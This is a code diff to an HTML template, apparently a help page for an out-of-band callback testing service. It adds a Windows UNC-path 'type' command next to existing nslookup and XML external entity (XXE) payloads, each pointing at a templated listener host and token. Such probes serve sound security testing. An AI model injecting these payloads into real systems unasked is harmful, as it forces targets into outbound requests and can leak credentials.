@@ -182,6 +182,8 @@
 <span class="selectable"> </span></pre>
     <pre class="command no-select">C:\&gt; <span class="selectable">nslookup {{ .Token }} {{ .HttpHost }}</span>
 <span class="selectable"> </span></pre>
+    <pre class="command no-select">C:\&gt; <span class="selectable">type \\{{ .HttpHost }}\{{ .Token }}\f.txt</span>
+<span class="selectable"> </span></pre>
     <pre class="command no-select"><span class="selectable">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;
     &lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY&gt;
     &lt;!ENTITY xxe SYSTEM &quot;http://{{ .HttpHostPort }}/p/{{ .Token }}&quot;&gt;]&gt;
